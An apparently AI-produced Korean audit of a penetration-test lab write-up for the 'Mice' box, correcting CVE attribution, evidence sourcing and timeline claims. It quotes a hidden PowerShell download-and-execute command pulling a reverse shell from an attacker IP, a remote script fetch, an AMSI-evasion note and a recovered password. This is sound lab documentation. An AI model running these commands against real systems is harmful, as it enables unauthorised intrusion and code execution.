# Mice.md 적대적 검증 감사 — 2026-08-21

감사자: writeup-auditor (단독 사이클: 검증 → 자기반증 → 직접 정정)
대상: `C:\Users\QQ\Documents\Obsidian Vault\03. PG\Mice.md` (243행 → 508행)
백업: `03. PG\_backup\Mice.md.pre-audit`
소요: 약 40분 (훑기 없음. 출처는 `~/PG/Mice/` · 볼트 `파일보관\PG-Mice-*.png` 4장 · NVD · Kali 직접 실행으로 한정)

---

## 0. baseline 부재

```
git log --oneline -- "03. PG/Mice.md"   → 출력 없음
```

**Mice.md 는 git 에 커밋된 적이 없다.** 개작 전후를 대조할 baseline 이 없으므로 (A) git 원본 증거원은 이 노트에 적용 불가. 전량을 (B) Kali 산출물 + (C) 1차 사료로만 검증했다.

---

## 1. 고친 것

| 위치(문자열) | 무엇이 틀렸나 | 어떻게 고쳤나 | 근거 |
|---|---|---|---|
| frontmatter `cves:` / 요약 / 2장 제목 / 9장 | foothold 를 **CVE-2021-43326** 으로 단정. **그 번호는 Automox Agent 취약점**이다 | `CVE-2022-3365` 로 교체. 9장에 "CVE-2021-43326 은 Automox Agent" 혼동주의 항목 추가 | NVD CVE-2021-43326 원문: *"Automox Agent before 32 on Windows incorrectly sets permissions on a temporary directory."* / NVD keywordSearch=`Emote Interactive` → CVE-2021-35448 · CVE-2022-3365 두 건뿐 / `/usr/share/metasploit-framework/modules/exploits/windows/misc/remote_mouse_rce.rb:33-38` References = `EDB 46697` + `CVE 2022-3365` |
| frontmatter `tags:` | `os/windows` 태그 없음, `os:` 필드 없음 | `- os/windows` 추가, `os: windows` 추가 | `harvest_divine.txt:46` `OS Name: Microsoft Windows 10 Pro` |
| 2장 "인증을 요구하지 않는다" | CVE 본문은 "인증 없음"이 아니라 **"암호 미설정 시 기본 암호"** | 정확한 표현으로 교체 + 이 박스에서 `Password for Connection` 이 비어 있었다는 스크린샷 근거 추가 | NVD CVE-2022-3365 / `PG-Mice-remotemouse-settings.png` |
| 3장 `python3 mice_type.py "powershell -c iex(irm .../o.ps1)"` | 셸을 연 것은 `/a` 다. **`o.ps1` 은 22:42 에 받은 Win32_Process 열거 스크립트**이고 리버스셸이 아니다. `-c` 는 재부팅 후 `r.ps1` 재시도에만 쓰였다 | 실제 타이핑된 형태 `powershell -nop -w hidden iex(irm http://192.168.45.207/a)` 로 교정 + `-nop`·`-w hidden` 플래그 해설 추가 | `http.log`(22:28~22:34 `/a`, 22:42 `/o.ps1`) · `attempt3_obf.log` · `www/o.ps1` 내용 |
| 3장 "4444 가 막혀 있고 80/443 만 허용 — SYN 조차 나가지 않았다" | tcpdump 산출물이 없다. **그런데 더 강한 실측이 따로 있었다** | 온타겟 egress 프로브 결과(`OPEN_443`·`OPEN_80`·`BLOCK_53`·`BLOCK_4444`·`BLOCK_8080`·`RTP_True`)를 `http.log` 원문 블록으로 교체 | `http.log` 22:29:35~38 |
| 3장 "셸 직후 반사 열거" 코드펜스 | `find/getcap 대신 → sc qc, icacls...` 라는 **산문이 코드펜스 안에** 들어 있었다 (CLAUDE.md §3 위반) | 코드펜스 제거하고 산문으로 전환, 실제 열거 결과를 `harvest_divine.txt` 값으로 채움 | `harvest_divine.txt` 각 섹션 |
| 3장 "`sc sdshow` 로 전 서비스 DACL" (6장에도 동일) | `sdshow` 는 어느 산출물에도 없다. harvest 가 한 것은 **서비스 바이너리 + icacls** | "서비스 바이너리와 그 상위 디렉터리 `icacls`" 로 교정 | `harvest_divine.txt:379` 섹션명 / `grep -i sdshow` 무결과 |
| 4장 `ValidateCredentials` 블록 | 대화형으로 친 것처럼 재구성돼 있었다(`# False` 주석 형태). 실제로는 스크립트 파일 | `www/e6.ps1` 원문 + `shell443.log:671-672` 실제 출력(`--VALID-ADMIN=False` / `--VALID-DIVINE=True`)으로 교체 | `www/e6.ps1` · `shell443.log:671` |
| 4장 "(freerdp·runas 로도 3중 확인)" | **`runas` 는 어느 산출물·`~/.zsh_history` 에도 없다** | 삭제. "이후 이 자격증명으로 RDP 가 실제로 붙은 것이 두 번째 확인" 으로 축소 | `grep -rn runas ~/PG/Mice` 무결과 |
| 4장 FileZilla XML | `<Port>`·`<Protocol>`·`<Type>`·`<Logontype>` 등이 말없이 잘린 축약본 | 원문 전문으로 복원 | `shell443.log:472-485` |
| 4장 관리자 플래그 블록 | 원시 캡처처럼 제시됐다 | **스크린샷을 블록 위로 올려 1차 증거임을 명시**, 코드블록은 "손으로 옮겨 적은 전사본"이라고 라벨 | `PG-Mice-proof-system.png` 픽셀 대조 |
| 4장 "왜 SYSTEM 이 되는가" | 결론은 옳았으나 근거 출력이 없었다 | `e17.ps1` 의 실제 `Name/ProcessId/ParentProcessId/SessionId` 출력 블록 추가 | `shell443.log:7832-7847` |
| 6장 "내 RDP 는 세션 2, RemoteMouse.exe(SI=3)는 콘솔 세션 3… 두 세션은 공유하지 않는다" | **번호도 메커니즘도 틀렸다.** divine 은 세션 1, GUI 프로세스도 세션 1 — 같은 세션이었다. `console`(ID 3)은 사용자 없이 비어 있었다 | `query session` 실측 블록을 넣고, 원인을 "재접속 세션에서 트레이 아이콘이 재생성되지 않았다"로 재서술(메커니즘은 `[가정]` 표기) | `shell443.log:7803-7811`(세션표) · `shell443.log:159-161`, `7832-7847`(SessionId=1) |
| 6장 AMSI 문단 | 차단 메시지를 **리버스셸** 것으로 적었다. 실제로 그 메시지가 붙은 것은 **PrivescCheck(`pc.ps1`)** 이고, 장소도 "RDP GUI 의 PowerShell 창"이 아니라 nc 셸이었다 | 실제 에러 블록(ParserError + `iex(irm .../pc.ps1)`)으로 교체. 리버스셸 차단은 **`[가정]` 으로 강등**하고 정황 3가지(RTP_True / 평문판 무응답 / 분할판 즉시 연결)를 명시 | `shell443.log:944-952` · `http.log` `/RTP_True` · `shell4444/53/8080.log`·`rce_retry.log` |
| 6장 "`icacls "C:\Program Files (x86)"` 는 `BUILTIN\Users:(RX)` 로 쓰기 불가" | **그 명령은 돌린 적이 없다.** 측정된 것은 `icacls C:\` | 실측 `icacls C:\` 블록으로 교체하고, **첫 후보가 `C:\Program.exe`(루트)** 임을 짚어 `(IO)`·`(AD)` 로 왜 파일 생성이 안 되는지 설명. 판정(배제)은 유지 | `shell443.log:893-899` (`--ICACLS-CROOT`) · `harvest_divine.txt:240` 서비스 경로 |
| 6장 `shutdown /r /t 0` | `/t 0` 근거 없음 | `shutdown /r` 로 교정. `SeShutdownPrivilege` 가 `Disabled` 로 보이는 이유도 함께 해설 | `writeup_notes.txt` 08:05 항목 · `harvest_divine.txt:36` |
| 남긴 흔적 | "총괄이 수동 정리 필요" / "지웠다"류 서술 | **「삭제 확인 못 함 — 박스 정지·리버트로 해소」** 로 재작성. 경위(안전분류기 → SSH 상실 → 라인 관리자가 Kali 정리 → 그 과정에서 셸 세션도 닫힘 → 타겟 정리 불가)를 명시. **확인한 것/확인 못 한 것 분리** | 총괄 확정 문구 · `harvest_admin.txt` 0바이트 · `rdp44.png` |

### 추가한 것 (없어서 넣은 것)

- **1장** — 1979·1980 의 `unisql-java?`·`pearldoc-xact?` 는 nmap 의 **포트번호 사전 출력**이지 식별 결과가 아님(`banner_others.txt` 둘 다 타임아웃). top-1000 으로는 3389 밖에 안 보임(`nmap_quick.log`). **주입은 UDP 1978, 배너는 TCP 1978**(`mice_type.py`).
- **1장** — nmap 의 `Product_Version: 10.0.19041` 과 `systeminfo` 의 19042 가 다른 이유.
- **6장 `C:\freezeScript\win10.ps1` 절 신설** — Administrator·`-ExecutionPolicy bypass` 로 **이 인스턴스가 켜진 날 06:10:10** 에 실행된 transcript 가 디스크에 남아 있으나, 디렉터리가 자기삭제됐고 사용자 접근 가능한 트리거(HKCU Run·비-MS 예약작업)가 없어 배제. (근거: `shell443.log:285-294`, `382-401`, `7850-7853`)
- **6장 harvest 권한별 차이 절 신설** — **divine 6,692행 / SYSTEM 9,282행, 차이 2,590행**, 16개 섹션 완주 + `DONE` 마커. 스크린샷 `PG-Mice-harvest-system-9282.png` 를 볼트에 추가하고 본문에 임베드.
- **6장 원시 캡처 부재 사유 절 신설** — SSH 차단으로 exfil 실패, `harvest_admin.txt` 0바이트, `rdp44.png` 의 이스케이프 깨진 원라이너 파서 에러.
- **6장** — 헤드리스에서 UAC 를 만나면 `The operation was canceled by the user` 가 나온다는 오독 방지 (`shell443.log:7813-7823`).
- **5장** — 각 플래그를 **어떤 셸에서** 읽었는지 열 추가 (웹셸 0점 규정 대비).
- **7장** — 항목 2(egress 일괄 측정)·6(권한 올린 뒤 재열거) 신설.
- **상단** `[!warning] 적대적 검증 정정 이력` 콜아웃 신설.

---

## 2. 삭제한 것 (원문 인용 — 되살릴 수 있게)

**삭제 1** — 4장, 근거 없는 검증 수단:

> `**ControlFreak11` 은 divine 자신의 Windows 암호였다** — Administrator 재사용이 아니다(freerdp·runas 로도 3중 확인).

`runas` 는 `~/PG/Mice/` 전체·`www/*.ps1`·`~/.zsh_history` 어디에도 없다. `freerdp` 도 `~/.zsh_history` 에 `192.168.248.199` 항목이 0건이다(다만 이 세션은 비대화형 SSH 로 돌아 history 에 남지 않으므로 **부재는 미실행의 증거가 아니다** → freerdp 는 삭제하지 않고 "RDP 가 실제로 붙었다"는 결과 사실로 유지). `runas` 만 삭제.

**삭제 2** — 3장, 근거 없는 관측 주장:

> 아웃바운드는 **4444 가 막혀 있고 80/443 만 허용**이었다 — 4444 로 붙인 셸은 SYN 조차 나가지 않았다.

`tcpdump` 산출물이 없다. 다만 **결론 자체는 옳았고** 더 나은 실측(`http.log` egress 프로브)이 있어 그것으로 대체했다. 결론은 보존됐다.

**삭제 3** — 3장, 코드펜스 안의 산문:

> ```
> whoami /all; net user; net localgroup administrators; whoami /priv
> find/getcap 대신 → sc qc, icacls, schtasks, reg query 로 Windows 권한상승 표면 훑기
> ```

두 번째 줄은 명령이 아니라 설명이다. 산문으로 옮겼다.

**단축 1** — 1장 nmap 블록의 `Running (JUST GUESSING): Microsoft Windows 10 ...` 는 `...` 로 잘려 있었고, `rdp-ntlm-info` 의 `NetBIOS_Domain_Name`·`NetBIOS_Computer_Name`·`DNS_Domain_Name` 세 줄이 **표시 없이** 빠져 있었다(비연속 행 이어붙이기). `nmap.log` 원문대로 복원.

---

## 3. 반증한 것 — 지적으로 올랐다가 확인 결과 노트가 옳았던 것

검증 절차 자체의 정확도 판단용이다. **이번 사이클에서 6건이 자기반증으로 철회됐다.**

1. **"GUI·Core 의 부모가 서비스 PID"** — 근거 출력이 본문에 없어 날조를 의심했다. `shell443.log:7832-7847` 에 `ParentProcessId: 2284` 가 둘 다 정확히 있었다. **노트가 옳았다.** 오히려 그 출력을 본문에 넣어 보강했다.
2. **`TESTREBOOT`** — `grep -rn TESTREBOOT ~/PG/Mice` 가 **0건**이라 날조로 기울었다. 그러나 `PG-Mice-system-saveas-dialog.png` 의 Edge 주소창에 `https://www.bing.com/search?q=TESTREBOOT&form=WNSGPH...` 가 선명하게 찍혀 있다. **노트가 옳았다.** 텍스트 산출물의 부재로 GUI 조작을 판정하면 안 된다는 사례가 하나 더 늘었다.
3. **Metasploit `remote_mouse` 모듈이 있다** — 실존 여부를 의심했으나 `/usr/share/metasploit-framework/modules/exploits/windows/misc/remote_mouse_rce.rb` 가 실제로 있다. **노트가 옳았고**, 덤으로 이 모듈의 References 가 CVE 정정의 결정적 근거가 됐다.
4. **Remote Mouse 3.008 버전 판정** — `shell443.log:868` 에 `Remote Mouse version 3.008` 이 그대로 있다. **노트가 옳았다.**
5. **`shell443.log` 가 23:26 에서 끊긴 것** — 로그가 잘려 있어 "이후 서술 전부 근거 없음"으로 갈 뻔했다. 확인해보니 러너가 그 시점에 `logoff` 로 nc 셸을 잃은 것이 원인이고(`writeup_notes.txt` 23:26 항목), 이후 작업은 전부 GUI 다. **스크롤백이 끊긴 지점을 확인하는 절차가 오판 1건을 막았다.**
6. **`SeShutdownPrivilege` 가 `Disabled`** — "없는데 있다고 썼다"로 볼 뻔했다. `Disabled` 는 부재가 아니라 미활성이고 `shutdown` 이 알아서 활성화한다. **노트가 옳았다.**

### 총괄이 준 지시 중 확인해보니 틀렸던 것

- **"CVE-2021-43326·CVE-2021-35448 이 `cves` 에 있는지 확인하라"** → CVE-2021-43326 은 **Automox Agent** 다. 지시대로 뒀으면 오류가 색인에 남았다. `CVE-2022-3365` 로 교체했다.
- **"18개 섹션 전부 완주"** → `harvest_divine.txt` 의 `^=====` 섹션 헤더는 **16개 + DONE** 이다. 본문에는 검증된 16으로 적었다. (9,282 / 6,692 / 2,590 · `DONE` 마커는 전부 확인됨 — `rdp43.png`.)
- **"`proof_admin.txt` 의 `whoami: ...` 라벨 형식이 노트 코드펜스에 들어 있다"** → 실제 노트의 코드블록은 **라벨 형식이 아니라 스크린샷과 동일한 콘솔 형식**이었다. 픽셀 대조 결과 값·순서·들여쓰기까지 일치한다. 따라서 코드펜스 자체는 유지하고 **전사본 라벨과 스크린샷 우선 명시만** 추가했다.

---

## 4. 타임존 환산 (자기모순 오판 방지)

- 타겟 로컬 = **PDT (UTC-7)**, Kali mtime = **KST (UTC+9)** → 차이 16시간.
- `harvest_divine.txt` 헤더 `2026-08-20T06:35:13-07:00` = 13:35 UTC = **22:35 KST** ↔ 파일 mtime `2026-08-20 22:36:42 +0900`. **일치.**
- proof 스크린샷 시계 `08:05 AM 8/20/2026` (PDT) = 15:05 UTC = **2026-08-21 00:05 KST** ↔ `rdp42.png` mtime `2026-08-21 00:05:41 +0900`. **일치.**
- `rdp43.png` 시계 `08:09 AM` ↔ mtime `00:09:25 KST`. **일치.**
- nmap `ssl-date: 2026-08-20T13:24:14+00:00` ↔ 스캔 mtime `22:24:14 KST`. **일치.**

시간 서사에 모순 없음.

---

## 5. 셸 프롬프트 표기 점검

- **Kali 프롬프트(`┌──(kali㉿kali)` / `└─$`) 위반: 0건.** 원본에도 없었고 추가하지도 않았다.
- **타겟 프롬프트는 전부 보존.** `PS C:\WINDOWS\system32>`(3장 user flag, 4장 ValidateCredentials 출력, 6장 AMSI·Start-Process), `C:\>`(4장 proof, 6장 harvest). 지우지 않았다.

---

## 6. 총괄 판단이 필요한 것

1. **`ports` 프론트매터에 `7680` 이 빠져 있다.** 노트 nmap 블록에는 `7680/tcp open pando-pub?` 가 있고 49152 미만이라 제외 규칙에도 안 걸린다. `refresh.ps1` 직후 상태이므로 `extract.py` 의 포트 추출이 `?` 붙은 미식별 포트를 빼는 것으로 보인다(1979·1980 도 `?` 인데 들어가 있어 규칙이 일관되지 않는다). **공유 인프라라 손대지 않았다.** 실해는 없다.
2. **`파일보관\PG-Mice-harvest-system-9282.png` 를 새로 추가했다** (`~/PG/Mice/rdp43.png` 복사). 총괄이 지목한 6,692/9,282 수치의 1차 증거를 볼트 안에 두기 위한 판단이다. 스크린샷 4장 → 5장이 됐다. 불필요하면 임베드 한 줄과 파일만 지우면 된다.
3. **`refresh.ps1` 은 지시대로 돌리지 않았다.** frontmatter 를 건드렸으므로(`cves`·`tags`·`os`) 다음 갱신 때 반영된다.

---

## 7. 근거 출처 일람

**Kali 산출물** (`kali@10.44.44.128:~/PG/Mice/`)
`nmap.log` · `nmap_quick.log` · `nmap_udp.log` · `nmap_allports_fast.log` · `banner_1978.txt` · `banner_others.txt` · `mice_type.py` · `attempt1~3_*.log` · `rce_retry.log` · `shell443.log`(7,868행) · `shell443b.log` · `shell4444/53/8080.log` · `up80.log` · `http.log` · `harvest_divine.txt`(6,692행) · `harvest_admin.txt`(**0바이트**) · `proof_user.txt` · `proof_admin.txt` · `writeup_notes.txt` · `www/{a,a.revshell443,o.ps1,r.ps1,s.ps1,e6.ps1,e17.ps1}` · `rdp43.png` · `rdp44.png`

**볼트 스크린샷** — `파일보관\PG-Mice-{proof-system,system-saveas-dialog,remotemouse-settings,admin-cmd}.png` 4장 전부 직접 열어 대조

**1차 사료** — NVD `CVE-2021-43326` · `CVE-2021-35448` · `CVE-2022-3365` (services.nvd.nist.gov REST API, `keywordSearch=Emote+Interactive`)

**Kali 직접 실행**
```
searchsploit -w remote mouse                  → EDB 46697 / 50047 / 50258 제목·번호 확인
grep -A5 'References' .../remote_mouse_rce.rb → EDB 46697 + CVE 2022-3365
git log --oneline -- "03. PG/Mice.md"         → 무결과 (baseline 없음)
```

**히스토리** — `~/.zsh_history`: `192.168.248.199` 0건, `mice` 0건. 이 세션이 전부 비대화형 SSH 로 돌아 기록되지 않았다. **부재를 근거로 쓰지 않았다.**

---

## 8. 수치

| | |
|---|---|
| 행수 | 243 → 508 |
| 정정 | 16건 |
| 삭제 | 3건 (전문 인용해 §2 에 보존) |
| `[가정]` 강등 | 2건 (리버스셸 AMSI 차단 / 트레이 아이콘 미렌더 메커니즘) |
| 원문 복원 | 3건 (nmap 블록 · FileZilla XML · ValidateCredentials 출력) |
| Kali 프롬프트 위반 | 0건 |
| 타겟 프롬프트 삭제 | 0건 |
| 자기반증으로 철회한 지적 | 6건 |
| 총괄 지시 중 반증 | 3건 |
